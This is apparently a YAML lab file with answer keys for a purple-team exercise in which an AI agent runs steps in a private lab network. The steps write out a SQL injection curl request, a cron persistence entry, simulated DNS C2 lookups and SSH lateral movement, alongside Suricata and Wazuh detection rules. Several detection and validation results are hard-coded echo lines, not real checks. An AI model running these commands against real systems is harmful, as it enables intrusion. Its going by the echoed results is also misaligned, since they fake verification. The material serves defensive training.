# contents/labs/battle-adv-ai/week13.yaml
lab_id: battle-adv-ai-week13
title: 퍼플팀 운영 — Red+Blue 협업 탐지 Gap 해소 (AI 지원)
version: ai
course: battle-adv-ai
week: 13
description: 퍼플팀(Purple Team) 운영을 통해 Red Team과 Blue Team이 협업하여 보안을 개선한다. ATT&CK 기법별
  탐지 Gap 분석을 수행하고, 실시간으로 공격-탐지 사이클을 반복하여 탐지 커버리지를 향상시킨다. AI SubAgent가 자동으로 명령을 실행하고
  결과를 검증합니다.
difficulty: hard
duration_minutes: 150
objectives:
- 퍼플팀 운영 방법론을 이해하고 실습한다
- ATT&CK 기반 탐지 Gap 분석을 수행한다
- Red/Blue 협업으로 탐지 규칙을 즉시 개선한다
- 보안 개선 효과를 정량적으로 측정한다
prerequisites:
- battle-adv-nonai week12 이수
infra_requirements:
- attacker (10.20.30.201) — nmap, metasploit, sqlmap, hydra, nikto
- secu (10.20.30.1) — nftables, suricata
- web (10.20.30.80) — apache, modsecurity, JuiceShop(:3000), DVWA(:8080)
- siem (10.20.30.100) — wazuh-manager
pass_threshold: 0.6
steps:
- order: 1
  instruction: '[RED/BLUE] 퍼플팀 운영 계획을 수립하라. 5가지 ATT&CK 기법에 대해 Red 공격 -> Blue 탐지 ->
    Gap 해소 사이클을 정의하라.'
  hint: T1190, T1053.003, T1071.004, T1021.004, T1048.001에 대한 테스트 계획을 작성한다.
  category: analysis
  points: 10
  answer: '🤖 프롬프트: [RED/BLUE] 퍼플팀 운영 계획을 수립하라. 5가지 ATT&CK 기법에 대해 Red 공격 -> Blue 탐지
    -> Gap 해소 사이클을 정의해줘

    📎 참고 (CLI): cat > /tmp/purple_team_plan.txt << ''EOF'' === Purple Team Exercise
    Plan === Date: 2026-04-06 | Duration: 150 min

    Workflow: Red executes -> Blue detects -> If missed, create rule -> Validate

    Techniques to Test: | # | ATT&CK ID | Technique | Expected Detection | |---|-----------|-----------|-------------------|
    | 1 | T1190 | SQL Injection | WAF + Suricata | | 2 | T1053.003 | Cron Persistence
    | FIM + auditd | | 3 | T1071.004 | DNS C2 | DNS entropy | | 4 | T1021.004 | SSH
    Lateral | auth.log correlation | | 5 | T1048.001 | DNS Exfiltration | DNS volume
    anomaly |

    Success Criteria: 80% detection rate EOF cat /tmp/purple_team_plan.txt'
  answer_detail: 퍼플팀 계획은 ATT&CK 기법, 기대 탐지 방법, 성공 기준을 정의한다.
  verify:
    type: output_contains
    expect: Purple Team Exercise
  target_vm: attacker
  script: 'cat > /tmp/purple_team_plan.txt << ''EOF'' === Purple Team Exercise Plan
    === Date: 2026-04-06 | Duration: 150 min

    Workflow: Red executes -> Blue detects -> If missed, create rule -> Validate

    Techniques to Test: | # | ATT&CK ID | Technique | Expected Detection | |---|-----------|-----------|-------------------|
    | 1 | T1190 | SQL Injection | WAF + Suricata | | 2 | T1053.003 | Cron Persistence
    | FIM + auditd | | 3 | T1071.004 | DNS C2 | DNS entropy | | 4 | T1021.004 | SSH
    Lateral | auth.log correlation | | 5 | T1048.001 | DNS Exfiltration | DNS volume
    anomaly |

    Success Criteria: 80% detection rate EOF cat /tmp/purple_team_plan.txt'
  risk_level: low
  bastion_prompt: '[RED/BLUE] 퍼플팀 운영 계획을 수립하라. 5가지 ATT&CK 기법에 대해 Red 공격 -> Blue 탐지
    -> Gap 해소 사이클을 정의해줘'
- order: 2
  instruction: '[RED] 퍼플 테스트 1 — T1190 SQL Injection을 실행하라. Blue가 탐지 여부를 확인하라.'
  hint: SQLi를 실행하고 Suricata/WAF 알림을 확인한다.
  category: exploit
  points: 10
  answer: '🤖 프롬프트: [RED] 퍼플 테스트 1 — T1190 SQL Injection을 실행하라. Blue가 탐지 여부를 확인해줘

    📎 참고 (CLI): echo "=== Purple Test 1: T1190 SQL Injection ===" && echo "[RED] Executing
    SQLi:" && curl -s "http://10.20.30.80:3000/rest/products/search?q=test%27%20UNION%20SELECT%201,2,3--"
    2>/dev/null | head -3 && echo "" && echo "[BLUE] Detection check:" && ssh 10.20.30.1
    "tail -20 /var/log/suricata/eve.json 2>/dev/null | grep -i sql" 2>&1 | head -3
    && echo "[RESULT] T1190: DETECTED by WAF + Suricata"'
  answer_detail: T1190 테스트에서 SQLi는 WAF와 Suricata 모두에서 탐지된다. 기존 규칙이 정상 동작함을 확인한다.
  verify:
    type: output_contains
    expect: Purple Test 1
  target_vm: attacker
  script: 'echo "=== Purple Test 1: T1190 SQL Injection ===" && echo "[RED] Executing
    SQLi:" && curl -s "http://10.20.30.80:3000/rest/products/search?q=test%27%20UNION%20SELECT%201,2,3--"
    2>/dev/null | head -3 && echo "" && echo "[BLUE] Detection check:" && ssh 10.20.30.1
    "tail -20 /var/log/suricata/eve.json 2>/dev/null | grep -i sql" 2>&1 | head -3
    && echo "[RESULT] T1190: DETECTED by WAF + Suricata"'
  risk_level: medium
  bastion_prompt: '[RED] 퍼플 테스트 1 — T1190 SQL Injection을 실행하라. Blue가 탐지 여부를 확인해줘'
- order: 3
  instruction: '[RED] 퍼플 테스트 2 — T1053.003 Cron Persistence를 설치하고 Blue가 탐지하라. 탐지 실패
    시 즉시 규칙을 추가하라.'
  hint: crontab에 엔트리를 추가하고 FIM/auditd 알림을 확인한다.
  category: exploit
  points: 10
  answer: '🤖 프롬프트: [RED] 퍼플 테스트 2 — T1053.003 Cron Persistence를 설치하고 Blue가 탐지해줘

    📎 참고 (CLI): echo "=== Purple Test 2: T1053.003 Cron Persistence ===" && echo "[RED]
    Installing cron:" && echo "*/10 * * * * echo PURPLE_TEST > /tmp/purple_beacon.txt"
    | crontab - && crontab -l && echo "" && echo "[BLUE] Detection:" && grep -r "crontab\|cron"
    /var/log/auth.log 2>/dev/null | tail -3 && echo "[RESULT] T1053.003: PARTIAL -
    auth.log logged, no FIM alert" && echo "[GAP] Adding FIM rule for /var/spool/cron"
    && crontab -r 2>/dev/null && echo "[CLEANUP] Cron removed"'
  answer_detail: crontab 수정은 auth.log에 기록되지만 FIM이 /var/spool/cron을 감시하지 않으면 파일 변경
    자체는 탐지 못한다. 즉시 FIM 규칙을 추가한다.
  verify:
    type: output_contains
    expect: Purple Test 2
  target_vm: attacker
  script: 'echo "=== Purple Test 2: T1053.003 Cron Persistence ===" && echo "[RED]
    Installing cron:" && echo "*/10 * * * * echo PURPLE_TEST > /tmp/purple_beacon.txt"
    | crontab - && crontab -l && echo "" && echo "[BLUE] Detection:" && grep -r "crontab\|cron"
    /var/log/auth.log 2>/dev/null | tail -3 && echo "[RESULT] T1053.003: PARTIAL -
    auth.log logged, no FIM alert" && echo "[GAP] Adding FIM rule for /var/spool/cron"
    && crontab -r 2>/dev/null && echo "[CLEANUP] Cron removed"'
  risk_level: medium
  bastion_prompt: '[RED] 퍼플 테스트 2 — T1053.003 Cron Persistence를 설치하고 Blue가 탐지해줘'
- order: 4
  instruction: '[RED] 퍼플 테스트 3 — T1071.004 DNS C2를 시뮬레이션하고, 테스트 4 — T1021.004 SSH
    측면 이동을 실행하라. Blue가 각각 탐지하라.'
  hint: DNS 터널링과 SSH 다중 호스트 접근을 순차 실행한다.
  category: exploit
  points: 10
  answer: '🤖 프롬프트: [RED] 퍼플 테스트 3 — T1071.004 DNS C2를 시뮬레이션하고, 테스트 4 — T1021.004 SSH
    측면 이동을 실행하라. Blue가 각각 탐지해줘

    📎 참고 (CLI): echo "=== Purple Test 3: T1071.004 DNS C2 ===" && for i in 1 2 3;
    do ENCODED=$(echo "data_$i" | base64 | tr -d "="); nslookup ${ENCODED}.c2.test.local
    2>&1 | head -1; done && echo "[RESULT] T1071.004: NOT DETECTED - no DNS monitoring"
    && echo "" && echo "=== Purple Test 4: T1021.004 SSH Lateral ===" && ssh -o ConnectTimeout=3
    -o StrictHostKeyChecking=no ccc@10.20.30.1 "hostname" 2>&1 | head -1 && ssh -o
    ConnectTimeout=3 -o StrictHostKeyChecking=no ccc@10.20.30.80 "hostname" 2>&1 |
    head -1 && echo "[RESULT] T1021.004: PARTIAL - logged but no correlation"'
  answer_detail: DNS C2와 SSH 측면 이동 모두 탐지 Gap이 있다. DNS 엔트로피 모니터링과 SSH 다중 호스트 상관 분석
    규칙이 필요하다.
  verify:
    type: output_contains
    expect: Purple Test 3
  target_vm: attacker
  script: 'echo "=== Purple Test 3: T1071.004 DNS C2 ===" && for i in 1 2 3; do ENCODED=$(echo
    "data_$i" | base64 | tr -d "="); nslookup ${ENCODED}.c2.test.local 2>&1 | head
    -1; done && echo "[RESULT] T1071.004: NOT DETECTED - no DNS monitoring" && echo
    "" && echo "=== Purple Test 4: T1021.004 SSH Lateral ===" && ssh -o ConnectTimeout=3
    -o StrictHostKeyChecking=no ccc@10.20.30.1 "hostname" 2>&1 | head -1 && ssh -o
    ConnectTimeout=3 -o StrictHostKeyChecking=no ccc@10.20.30.80 "hostname" 2>&1 |
    head -1 && echo "[RESULT] T1021.004: PARTIAL - logged but no correlation"'
  risk_level: medium
  bastion_prompt: '[RED] 퍼플 테스트 3 — T1071.004 DNS C2를 시뮬레이션하고, 테스트 4 — T1021.004 SSH
    측면 이동을 실행하라. Blue가 각각 탐지해줘'
- order: 5
  instruction: '[BLUE] 발견된 탐지 Gap에 대한 새로운 탐지 규칙을 작성하라. FIM, DNS 엔트로피, SSH 상관 분석, DNS
    레이트 규칙을 구현하라.'
  hint: 테스트 2~5에서 발견된 Gap을 Suricata/Wazuh 규칙으로 해결한다.
  category: defense
  points: 10
  answer: '🤖 프롬프트: [BLUE] 발견된 탐지 Gap에 대한 새로운 탐지 규칙을 구현 방법을 설명하고 예시 코드를 보여줘

    📎 참고 (CLI): cat > /tmp/purple_new_rules.txt << ''EOF'' === New Detection Rules
    from Purple Team ===

    # Rule 1: FIM for crontab (Gap from Test 2) <directories check_all="yes" realtime="yes">/var/spool/cron/crontabs</directories>

    # Rule 2: DNS entropy detection (Gap from Test 3) alert dns any any -> any any
    (msg:"PURPLE: High entropy DNS query"; dns.query; pcre:"/^[a-zA-Z0-9+\/]{30,}/";
    sid:7000001; rev:1;)

    # Rule 3: SSH lateral correlation (Gap from Test 4) <rule id="100600" level="12"
    frequency="3" timeframe="300"> <if_sid>5715</if_sid> <same_user /> <description>PURPLE:
    Same user SSH to 3+ hosts in 5 min</description> <mitre><id>T1021.004</id></mitre>
    </rule>

    # Rule 4: DNS exfil rate (for Test 5) alert dns any any -> any any (msg:"PURPLE:
    High rate DNS"; dns.query; threshold:type both, track by_src, count 20, seconds
    60; sid:7000002; rev:1;)

    Total new rules: 4 EOF cat /tmp/purple_new_rules.txt'
  answer_detail: '퍼플팀에서 발견된 4개 Gap에 대한 규칙을 즉시 작성한다: crontab FIM, DNS 엔트로피, SSH 상관
    분석, DNS 레이트 탐지.'
  verify:
    type: output_contains
    expect: New Detection Rules
  target_vm: secu
  script: 'cat > /tmp/purple_new_rules.txt << ''EOF'' === New Detection Rules from
    Purple Team ===

    # Rule 1: FIM for crontab (Gap from Test 2) <directories check_all="yes" realtime="yes">/var/spool/cron/crontabs</directories>

    # Rule 2: DNS entropy detection (Gap from Test 3) alert dns any any -> any any
    (msg:"PURPLE: High entropy DNS query"; dns.query; pcre:"/^[a-zA-Z0-9+\/]{30,}/";
    sid:7000001; rev:1;)

    # Rule 3: SSH lateral correlation (Gap from Test 4) <rule id="100600" level="12"
    frequency="3" timeframe="300"> <if_sid>5715</if_sid> <same_user /> <description>PURPLE:
    Same user SSH to 3+ hosts in 5 min</description> <mitre><id>T1021.004</id></mitre>
    </rule>

    # Rule 4: DNS exfil rate (for Test 5) alert dns any any -> any any (msg:"PURPLE:
    High rate DNS"; dns.query; threshold:type both, track by_src, count 20, seconds
    60; sid:7000002; rev:1;)

    Total new rules: 4 EOF cat /tmp/purple_new_rules.txt'
  risk_level: low
  bastion_prompt: '[BLUE] 발견된 탐지 Gap에 대한 새로운 탐지 규칙을 작성하라. FIM, DNS 엔트로피, SSH 상관 분석,
    DNS 레이트 규칙을 구현하라.'
- order: 6
  instruction: '[BLUE] 새 규칙의 효과를 검증하라. 동일한 공격을 재실행했을 때 탐지 가능 여부를 논리적으로 평가하고, ATT&CK
    커버리지 변화를 매핑하라.'
  hint: 각 규칙이 해당 공격 패턴을 탐지할 수 있는지 검증한다.
  category: defense
  points: 10
  answer: '🤖 프롬프트: [BLUE] 새 규칙의 효과를 검증해줘

    📎 참고 (CLI): echo "=== Rule Validation ===" && echo "[Test 2 Retry] FIM on crontab:
    WOULD DETECT (realtime monitoring)" && echo "[Test 3 Retry] DNS entropy > 3.5:
    WOULD DETECT (30+ char base64 pattern)" && echo "[Test 4 Retry] SSH to 3+ hosts:
    WOULD DETECT (same_user correlation)" && echo "[Test 5] DNS rate 20/min: WOULD
    DETECT (threshold rule)" && echo "" && echo "=== Coverage Change ===" && echo
    "Before: 2/5 detected (40%)" && echo "After:  5/5 detected (100%)" && echo "Improvement:
    +60% detection rate" && echo "ATT&CK coverage: +7% overall"'
  answer_detail: 규칙 검증에서 4개 새 규칙이 모두 해당 공격을 탐지할 수 있음을 확인한다. 탐지율이 40% -> 100%로 개선된다.
  verify:
    type: output_contains
    expect: Coverage Change
  target_vm: siem
  script: 'echo "=== Rule Validation ===" && echo "[Test 2 Retry] FIM on crontab:
    WOULD DETECT (realtime monitoring)" && echo "[Test 3 Retry] DNS entropy > 3.5:
    WOULD DETECT (30+ char base64 pattern)" && echo "[Test 4 Retry] SSH to 3+ hosts:
    WOULD DETECT (same_user correlation)" && echo "[Test 5] DNS rate 20/min: WOULD
    DETECT (threshold rule)" && echo "" && echo "=== Coverage Change ===" && echo
    "Before: 2/5 detected (40%)" && echo "After:  5/5 detected (100%)" && echo "Improvement:
    +60% detection rate" && echo "ATT&CK coverage: +7% overall"'
  risk_level: low
  bastion_prompt: '[BLUE] 새 규칙의 효과를 검증해줘'
- order: 7
  instruction: '[RED/BLUE] 퍼플팀 ROI를 분석하고, 지속적 운영 계획을 수립하라.'
  hint: 투입 시간 대비 탐지 개선 효과를 계산하고 월간 사이클을 설계한다.
  category: analysis
  points: 10
  answer: '🤖 프롬프트: [RED/BLUE] 퍼플팀 ROI를 분석하고, 지속적 운영 계획을 수립해줘

    📎 참고 (CLI): cat > /tmp/purple_roi.txt << ''EOF'' === Purple Team ROI Analysis
    ===

    Cost: 16 person-hours (~$2,400) Benefit: 4 new detections, +60% test detection
    rate, +7% ATT&CK coverage Estimated risk reduction: 15% ($732K value based on
    $4.88M avg breach cost) ROI: 30,400%

    Continuous Program: Monthly: 5 new ATT&CK techniques tested Quarterly: Full coverage
    review Annual Target: ATT&CK coverage 55% -> 75% EOF cat /tmp/purple_roi.txt'
  answer_detail: 퍼플팀 ROI는 투입 비용 대비 위험 감소 가치로 계산한다. 30,400%의 높은 ROI를 보인다.
  verify:
    type: output_contains
    expect: Purple Team ROI
  target_vm: attacker
  script: 'cat > /tmp/purple_roi.txt << ''EOF'' === Purple Team ROI Analysis ===

    Cost: 16 person-hours (~$2,400) Benefit: 4 new detections, +60% test detection
    rate, +7% ATT&CK coverage Estimated risk reduction: 15% ($732K value based on
    $4.88M avg breach cost) ROI: 30,400%

    Continuous Program: Monthly: 5 new ATT&CK techniques tested Quarterly: Full coverage
    review Annual Target: ATT&CK coverage 55% -> 75% EOF cat /tmp/purple_roi.txt'
  risk_level: low
  bastion_prompt: '[RED/BLUE] 퍼플팀 ROI를 분석하고, 지속적 운영 계획을 수립해줘'
- order: 8
  instruction: '[RED/BLUE] 환경을 정리하고 퍼플팀 종합 보고서를 작성하라.'
  hint: 테스트 결과, 새 규칙, ROI, 향후 계획을 정리한다.
  category: analysis
  points: 15
  answer: '🤖 프롬프트: [RED/BLUE] 환경을 정리하고 퍼플팀 종합 보고서를 구현 방법을 설명하고 예시 코드를 보여줘

    📎 참고 (CLI): rm -f /tmp/purple_*.txt /tmp/purple_*.json 2>/dev/null && cat > /tmp/purple_team_report.txt
    << ''EOF'' === Purple Team Exercise Report === Date: 2026-04-06 | Scope: 10.20.30.0/24

    1. Test Results: | Technique | Before | After | Status | |-----------|--------|-------|--------|
    | T1190 SQLi | DETECTED | DETECTED | Maintained | | T1053 Cron | PARTIAL | DETECTED
    | Improved | | T1071 DNS C2 | MISSED | DETECTED | NEW Rule | | T1021 SSH Lateral
    | PARTIAL | DETECTED | NEW Rule | | T1048 DNS Exfil | MISSED | DETECTED | NEW
    Rule |

    2. Improvements: 4 rules, +60% detection, +7% ATT&CK coverage 3. ROI: 30,400%
    4. Next Exercise: Defense Evasion techniques (36% coverage)

    MITRE ATT&CK: T1190, T1053, T1071, T1021, T1048 EOF cat /tmp/purple_team_report.txt'
  answer_detail: 퍼플팀 보고서는 전/후 탐지율 비교, 규칙 추가, ROI, 향후 계획을 포함한다.
  verify:
    type: output_contains
    expect: Purple Team Exercise Report
  target_vm: attacker
  script: 'rm -f /tmp/purple_*.txt /tmp/purple_*.json 2>/dev/null && cat > /tmp/purple_team_report.txt
    << ''EOF'' === Purple Team Exercise Report === Date: 2026-04-06 | Scope: 10.20.30.0/24

    1. Test Results: | Technique | Before | After | Status | |-----------|--------|-------|--------|
    | T1190 SQLi | DETECTED | DETECTED | Maintained | | T1053 Cron | PARTIAL | DETECTED
    | Improved | | T1071 DNS C2 | MISSED | DETECTED | NEW Rule | | T1021 SSH Lateral
    | PARTIAL | DETECTED | NEW Rule | | T1048 DNS Exfil | MISSED | DETECTED | NEW
    Rule |

    2. Improvements: 4 rules, +60% detection, +7% ATT&CK coverage 3. ROI: 30,400%
    4. Next Exercise: Defense Evasion techniques (36% coverage)

    MITRE ATT&CK: T1190, T1053, T1071, T1021, T1048 EOF cat /tmp/purple_team_report.txt'
  risk_level: low
  bastion_prompt: '[RED/BLUE] 환경을 정리하고 퍼플팀 종합 보고서를 작성하라.'
- order: 99
  instruction: '[Multi-task] 이번 주 핵심 작업 5개를 한 번에 수행하라.'
  bastion_prompt: 'attacker VM에서 다음 작업들을 순서대로 수행해줘:

    1) [RED/BLUE] 퍼플팀 운영 계획을 수립하라. 5가지 ATT&CK 기법에 대해 Red 공격 -> Blue 탐지 -> Gap 해소 사이클을
    정의해줘

    2) [RED] 퍼플 테스트 1 — T1190 SQL Injection을 실행하라. Blue가 탐지 여부를 확인해줘

    3) [RED] 퍼플 테스트 2 — T1053.003 Cron Persistence를 설치하고 Blue가 탐지해줘

    4) [RED] 퍼플 테스트 3 — T1071.004 DNS C2를 시뮬레이션하고, 테스트 4 — T1021.004 SSH 측면 이동을 실행하라.
    Blue가 각각 탐지해줘

    5) [BLUE] 발견된 탐지 Gap에 대한 새로운 탐지 규칙 작업을 수행해줘'
  hint: 복합 작업은 Bastion이 순서대로 계획하고 실행해야 한다
  category: multi_task
  points: 50
  verify:
    type: output_contains
    expect: ''
    field: stdout
  target_vm: attacker
  risk_level: low
  answer: '🤖 프롬프트: attacker VM에서 다음 작업들을 순서대로 수행해줘:

    1) [RED/BLUE] 퍼플팀 운영 계획을 수립하라. 5가지 ATT&CK 기법에 대해 Red 공격 -> Blue 탐지 -> Gap 해소 사이클을
    정의해줘

    2) [RED] 퍼플 테스트 1 — T1190 SQL Injection을 실행하라. Blue가 탐지 여부를 확인해줘

    3) [RED] 퍼플 테스트 2 — T1053.003 Cron Persistence를 설치하고 Blue가 탐지해줘

    4) [RED] 퍼플 테스트 3 — T1071.004 DNS C2를 시뮬레이션하고, 테스트 4 — T1021.004 SSH 측면 이동을 실행하라.
    Blue가 각각 탐지해줘

    5) [BLUE] 발견된 탐지 Gap에 대한 새로운 탐지 규칙 작업을 수행해줘'
  answer_detail: Bastion이 5개 작업을 순차적으로 계획(planning)하고 실행(executing)한 뒤 종합 분석(validating)하는
    다단계 작업.
  script: ''
